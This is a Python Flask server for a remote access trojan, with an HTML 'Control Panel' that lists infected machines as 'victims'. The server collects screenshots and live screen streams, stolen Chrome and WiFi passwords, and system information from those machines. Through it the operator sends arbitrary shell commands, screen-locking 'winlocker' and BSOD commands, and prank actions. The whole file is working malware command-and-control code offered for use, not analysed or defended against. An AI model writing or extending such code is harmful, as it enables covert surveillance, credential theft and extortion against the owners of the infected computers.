# =====================================================================
# СЕРВЕР С ПРИКОЛЬНЫМИ ФУНКЦИЯМИ
# Замени server.py на GitHub
# =====================================================================
from flask import Flask, request, jsonify
import time
import base64
import requests as req

app = Flask(__name__)

clients = {}
commands = {}
notifications = []

def get_country(ip):
    try:
        r = req.get(f"http://ip-api.com/json/{ip}?fields=country,city", timeout=3)
        if r.status_code == 200:
            data = r.json()
            return f"{data.get('city', '')}, {data.get('country', '')}"
    except:
        pass
    return "Unknown"

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    client_id = str(int(time.time() * 1000))
    ip = request.remote_addr
    country = get_country(ip)
    
    clients[client_id] = {
        "hostname": data.get("hostname"),
        "username": data.get("username"),
        "os": data.get("os"),
        "ip": ip,
        "country": country,
        "last_seen": time.time(),
        "last_screenshot": "",
        "sysinfo": {},
        "chrome_data": "",
        "wifi_data": "",
        "exec_result": ""
    }
    commands[client_id] = []
    notifications.append({
        "text": f"🟢 {data.get('hostname')} from {country}",
        "time": time.strftime("%H:%M:%S")
    })
    return jsonify({"id": client_id})

@app.route('/data/<client_id>', methods=['POST'])
def receive_data(client_id):
    if client_id in clients:
        data = request.json
        data_type = data.get("type")
        
        if data_type in ["screenshot", "stream_frame"]:
            clients[client_id]["last_screenshot"] = data.get("data", "")
        elif data_type == "sysinfo":
            clients[client_id]["sysinfo"] = data.get("data", {})
        elif data_type == "chrome_passwords":
            clients[client_id]["chrome_data"] = data.get("data", "")
        elif data_type == "wifi_passwords":
            clients[client_id]["wifi_data"] = data.get("data", "")
        elif data_type == "exec_result":
            clients[client_id]["exec_result"] = data.get("data", "")
        
        clients[client_id]["last_seen"] = time.time()
    return jsonify({"status": "ok"})

@app.route('/screenshot/<client_id>')
def get_screenshot(client_id):
    if client_id in clients and clients[client_id].get("last_screenshot"):
        try:
            img_data = base64.b64decode(clients[client_id]["last_screenshot"])
            return img_data, 200, {'Content-Type': 'image/jpeg', 'Cache-Control': 'no-cache'}
        except:
            pass
    return "no", 404

@app.route('/command/<client_id>', methods=['GET'])
def send_command(client_id):
    if client_id in commands and commands[client_id]:
        return jsonify(commands[client_id].pop(0))
    return jsonify({"command": "ping"})

@app.route('/clients', methods=['GET'])
def get_clients():
    result = {}
    for cid, info in clients.items():
        if time.time() - info["last_seen"] < 60:
            result[cid] = {
                "hostname": info["hostname"],
                "username": info["username"],
                "os": info["os"],
                "ip": info.get("ip", ""),
                "country": info.get("country", "Unknown"),
                "has_screenshot": bool(info.get("last_screenshot")),
                "sysinfo": info.get("sysinfo", {}),
                "chrome_data": info.get("chrome_data", ""),
                "wifi_data": info.get("wifi_data", ""),
                "exec_result": info.get("exec_result", "")
            }
    return jsonify(result)

@app.route('/send_command/<client_id>', methods=['POST'])
def add_command(client_id):
    if client_id in commands:
        cmd = request.json
        command = cmd.get("command")
        times = 3 if command in ["lock", "unlock", "winlocker", "shutdown", "restart", "bsod"] else 1
        for _ in range(times):
            commands[client_id].append(cmd)
    return jsonify({"status": "ok"})

@app.route('/notifications')
def get_notifications():
    return jsonify(notifications[-20:])

@app.route('/')
def home():
    return """
<!DOCTYPE html>
<html>
<head>
    <title>Control Panel v3.0 - FUNNY MODE</title>
    <meta charset="UTF-8">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes slideIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(79,195,247,0.4); } 70% { box-shadow: 0 0 0 10px rgba(79,195,247,0); } 100% { box-shadow: 0 0 0 0 rgba(79,195,247,0); } }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        @keyframes rainbow { 0% { color: #ff0000; } 14% { color: #ff8800; } 28% { color: #ffff00; } 42% { color: #00ff00; } 57% { color: #0088ff; } 71% { color: #0000ff; } 85% { color: #8800ff; } 100% { color: #ff0000; } }
        @keyframes shake { 0%,100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
        
        body { background: #0a0e14; color: #c9d1d9; font-family: 'Segoe UI', system-ui; height: 100vh; display: flex; overflow: hidden; }
        
        .sidebar { width: 280px; background: #111922; border-right: 1px solid #1e2d3d; display: flex; flex-direction: column; animation: slideIn 0.5s ease; }
        .sidebar-header { padding: 20px; background: linear-gradient(135deg, #1a2733, #111922); border-bottom: 1px solid #1e2d3d; }
        .sidebar-header h2 { color: #4fc3f7; font-size: 18px; font-weight: 700; }
        .sidebar-header .status { color: #81c784; font-size: 11px; margin-top: 5px; display: flex; align-items: center; gap: 6px; }
        .status-dot { width: 8px; height: 8px; background: #81c784; border-radius: 50%; animation: pulse 2s infinite; }
        
        .notifications { max-height: 150px; overflow-y: auto; padding: 10px; }
        .notification { background: #0d1520; padding: 10px 12px; margin-bottom: 6px; border-radius: 6px; font-size: 11px; color: #81c784; border-left: 3px solid #81c784; animation: fadeIn 0.3s ease; }
        .notification .time { color: #4fc3f7; font-size: 9px; }
        
        .client-list { flex: 1; overflow-y: auto; padding: 10px; }
        .client-item { background: #0d1520; border: 2px solid #1e2d3d; border-radius: 10px; padding: 14px; margin-bottom: 8px; cursor: pointer; transition: all 0.3s ease; animation: fadeIn 0.4s ease; }
        .client-item:hover { border-color: #4fc3f7; transform: translateX(5px); background: #111d2b; }
        .client-item.active { border-color: #4fc3f7; background: #111d2b; }
        .client-item .name { color: #4fc3f7; font-weight: 600; font-size: 14px; display: flex; align-items: center; gap: 8px; }
        .client-item .info { color: #8b949e; font-size: 10px; margin-top: 4px; line-height: 1.5; }
        .dot { width: 8px; height: 8px; background: #81c784; border-radius: 50%; animation: pulse 2s infinite; }
        
        .main-content { flex: 1; display: flex; flex-direction: column; }
        
        .toolbar { background: #111922; padding: 12px 20px; display: flex; gap: 6px; flex-wrap: wrap; border-bottom: 1px solid #1e2d3d; }
        .toolbar button { background: #1a2733; color: #4fc3f7; border: 1px solid #2d3a4a; padding: 7px 12px; border-radius: 8px; cursor: pointer; font-size: 11px; font-weight: 500; transition: all 0.3s ease; }
        .toolbar button:hover { background: #4fc3f7; color: #0f1923; border-color: #4fc3f7; transform: translateY(-2px); }
        .toolbar button:active { transform: scale(0.95); }
        .toolbar button.danger { color: #ef5350; border-color: #ef5350; }
        .toolbar button.danger:hover { background: #ef5350; color: #fff; }
        .toolbar button.green { color: #81c784; border-color: #81c784; }
        .toolbar button.green:hover { background: #81c784; color: #0f1923; }
        .toolbar button.funny { color: #ffaa00; border-color: #ffaa00; animation: shake 0.5s infinite; }
        .toolbar button.funny:hover { background: #ffaa00; color: #000; animation: none; }
        .toolbar button.rainbow { animation: rainbow 3s infinite; border-color: #ffaa00; }
        .toolbar button.rainbow:hover { background: #fff; animation: none; }
        
        .content-area { flex: 1; display: flex; padding: 10px; gap: 10px; overflow: hidden; }
        
        .panel { background: #111922; border-radius: 12px; border: 1px solid #1e2d3d; }
        .screenshot-panel { flex: 1; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        .screenshot-panel img { max-width: 100%; max-height: 100%; object-fit: contain; }
        .placeholder { color: #3a4a5a; font-size: 16px; text-align: center; }
        
        .info-panel { width: 380px; padding: 20px; overflow-y: auto; }
        .info-panel h3 { color: #4fc3f7; font-size: 14px; margin-bottom: 10px; margin-top: 15px; }
        .info-panel h3:first-child { margin-top: 0; }
        .info-row { display: flex; padding: 6px 0; border-bottom: 1px solid #1a2733; font-size: 12px; }
        .info-label { color: #8b949e; width: 100px; flex-shrink: 0; font-weight: 500; }
        .info-value { color: #e6edf3; }
        pre { background: #0a0e14; padding: 12px; border-radius: 8px; font-size: 11px; color: #81c784; white-space: pre-wrap; max-height: 200px; overflow-y: auto; border: 1px solid #1e2d3d; }
        
        .console-panel { width: 320px; background: #0a0e14; display: flex; flex-direction: column; }
        .console-header { padding: 10px 15px; font-size: 12px; color: #4fc3f7; border-bottom: 1px solid #1e2d3d; font-weight: 600; }
        .console-output { flex: 1; overflow-y: auto; padding: 10px; font-family: 'Consolas', monospace; font-size: 11px; color: #81c784; }
        .console-input { display: flex; border-top: 1px solid #1e2d3d; }
        .console-input input { flex: 1; background: #0a0e14; border: none; color: #81c784; padding: 10px; font-family: 'Consolas', monospace; font-size: 11px; outline: none; }
        .console-input button { background: #4fc3f7; color: #0a0e14; border: none; padding: 10px 16px; cursor: pointer; font-weight: 700; }
        
        .section-title { color: #ffaa00; font-size: 11px; font-weight: 600; margin: 8px 0 4px 0; }
        
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #0a0e14; }
        ::-webkit-scrollbar-thumb { background: #1e2d3d; border-radius: 3px; }
    </style>
</head>
<body>
    <div class="sidebar">
        <div class="sidebar-header">
            <h2>⬡ CONTROL PANEL v3.0</h2>
            <div class="status"><span class="status-dot"></span> Server Online</div>
        </div>
        <div class="notifications" id="notifications"></div>
        <div class="client-list" id="clientList">
            <div class="placeholder">Waiting for victims...</div>
        </div>
    </div>
    
    <div class="main-content">
        <div class="toolbar">
            <button onclick="sendCmd('screenshot')">📸 Screenshot</button>
            <button class="green" onclick="startStream()">📡 Stream</button>
            <button class="danger" onclick="stopStream()">⏹ Stop</button>
            <button onclick="sendCmd('sysinfo')">💻 SysInfo</button>
            <button onclick="sendCmd('steal_chrome')">🔑 Chrome</button>
            <button onclick="sendCmd('steal_wifi')">📶 WiFi</button>
            <button class="green" onclick="sendCmd('lock')">🔒 Lock</button>
            <button onclick="sendCmd('unlock')">🔓 Unlock</button>
            <button class="danger" onclick="sendCmd('shutdown')">⏻ Off</button>
            <button class="danger" onclick="sendCmd('restart')">🔄 Reboot</button>
            <button onclick="sendMsg()">💬 Msg</button>
            <button class="danger" onclick="sendCmd('winlocker')">🚫 WinLock</button>
            <button class="danger" onclick="sendCmd('bsod')">⚠ BSOD</button>
            
            <div class="section-title" style="width:100%">😂 FUNNY COMMANDS:</div>
            
            <button class="funny" onclick="sendCmd('funny_msg')">😂 Смешное окно</button>
            <button class="funny" onclick="sendCmd('crazy_screen')">🤪 Безумный экран</button>
            <button class="funny" onclick="sendCmd('crazy_mouse')">🖱 Мышь-псих</button>
            <button class="funny" onclick="sendCmd('rickroll')">🎵 RickRoll</button>
            <button class="funny" onclick="sendCmd('draw')">🎨 Рисовать</button>
            <button class="funny" onclick="sendCmd('beep')">🔊 Пищать</button>
            <button class="funny" onclick="sendCmd('cdrom')">💿 Дисковод</button>
            <button class="rainbow" onclick="sendCmd('type_funny')">⌨️ Печатать</button>
        </div>
        
        <div class="content-area">
            <div class="panel screenshot-panel" id="screenPanel">
                <div class="placeholder">🖥 Select victim → Screenshot</div>
            </div>
            
            <div class="panel info-panel" id="infoPanel">
                <h3>💻 System Information</h3>
                <div id="sysinfoContent"><div class="placeholder">Click SysInfo</div></div>
                <h3>📄 Command Output</h3>
                <pre id="execOutput">No commands</pre>
                <h3>🔑 Chrome Passwords</h3>
                <pre id="chromeContent">Click Chrome</pre>
                <h3>📶 WiFi Passwords</h3>
                <pre id="wifiContent">Click WiFi</pre>
            </div>
            
            <div class="panel console-panel">
                <div class="console-header">📋 Console</div>
                <div class="console-output" id="console"></div>
                <div class="console-input">
                    <input type="text" id="cmdInput" placeholder="cmd..." onkeypress="if(event.key==='Enter')execCmd()">
                    <button onclick="execCmd()">▶ RUN</button>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        let selectedClient = null;
        let streamInterval = null;
        
        function log(msg) {
            let t = new Date().toLocaleTimeString();
            let c = document.getElementById('console');
            c.innerHTML += `<div class="log-entry"><span class="time">[${t}]</span>${msg}</div>`;
            c.scrollTop = c.scrollHeight;
        }
        
        function updateAll() {
            fetch('/clients').then(r => r.json()).then(data => {
                let html = '';
                for(let id in data) {
                    let c = data[id];
                    let active = selectedClient === id ? ' active' : '';
                    html += `<div class="client-item${active}" onclick="selectClient('${id}')">
                        <div class="name"><span class="dot"></span>${c.hostname}</div>
                        <div class="info">👤 ${c.username}<br>🌐 ${c.ip}<br>📍 ${c.country}<br>💻 ${c.os}</div>
                    </div>`;
                }
                document.getElementById('clientList').innerHTML = html || '<div class="placeholder">No victims</div>';
                
                if(selectedClient && data[selectedClient]) {
                    let c = data[selectedClient];
                    if(c.has_screenshot && streamInterval) {
                        let img = document.getElementById('screenPanel').querySelector('img');
                        if(img) img.src = `/screenshot/${selectedClient}?t=${Date.now()}`;
                        else document.getElementById('screenPanel').innerHTML = `<img src="/screenshot/${selectedClient}">`;
                    }
                    if(c.sysinfo && Object.keys(c.sysinfo).length > 0) {
                        let h = '';
                        for(let k in c.sysinfo) h += `<div class="info-row"><span class="info-label">${k}:</span><span class="info-value">${c.sysinfo[k]}</span></div>`;
                        document.getElementById('sysinfoContent').innerHTML = h;
                    }
                    if(c.chrome_data) document.getElementById('chromeContent').textContent = c.chrome_data;
                    if(c.wifi_data) document.getElementById('wifiContent').textContent = c.wifi_data;
                    if(c.exec_result) document.getElementById('execOutput').textContent = c.exec_result;
                }
            });
            
            fetch('/notifications').then(r => r.json()).then(data => {
                let h = '';
                data.reverse().forEach(n => h += `<div class="notification"><div>${n.text}</div><div class="time">${n.time}</div></div>`);
                document.getElementById('notifications').innerHTML = h;
            });
        }
        
        function selectClient(id) {
            selectedClient = id;
            log(`Selected: ${id}`);
            document.querySelectorAll('.client-item').forEach(el => el.classList.remove('active'));
            event.target.closest('.client-item').classList.add('active');
            sendCmd('screenshot');
            setTimeout(updateAll, 2000);
        }
        
        function sendCmd(command) {
            if(!selectedClient) { alert('Select victim!'); return; }
            fetch('/send_command/' + selectedClient, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({command: command})
            });
            log(`Sent: ${command}`);
        }
        
        function startStream() {
            if(!selectedClient) { alert('Select victim!'); return; }
            sendCmd('stream_start');
            log('📡 Stream started');
            if(streamInterval) clearInterval(streamInterval);
            streamInterval = setInterval(() => { sendCmd('screenshot'); setTimeout(updateAll, 1500); }, 2000);
        }
        
        function stopStream() {
            if(streamInterval) clearInterval(streamInterval);
            streamInterval = null;
            sendCmd('stream_stop');
            log('⏹ Stream stopped');
        }
        
        function execCmd() {
            let cmd = document.getElementById('cmdInput').value;
            if(cmd && selectedClient) {
                sendCmd('exec');
                fetch('/send_command/' + selectedClient, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({command: 'exec', cmd: cmd})
                });
                document.getElementById('cmdInput').value = '';
                setTimeout(updateAll, 3000);
            }
        }
        
        function sendMsg() {
            if(!selectedClient) { alert('Select victim!'); return; }
            let msg = prompt('Message:');
            if(msg) {
                sendCmd('message');
                fetch('/send_command/' + selectedClient, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({command: 'message', text: msg})
                });
            }
        }
        
        setInterval(updateAll, 2000);
        updateAll();
        log('🚀 Panel ready - FUNNY MODE activated! 😂');
    </script>
</body>
</html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
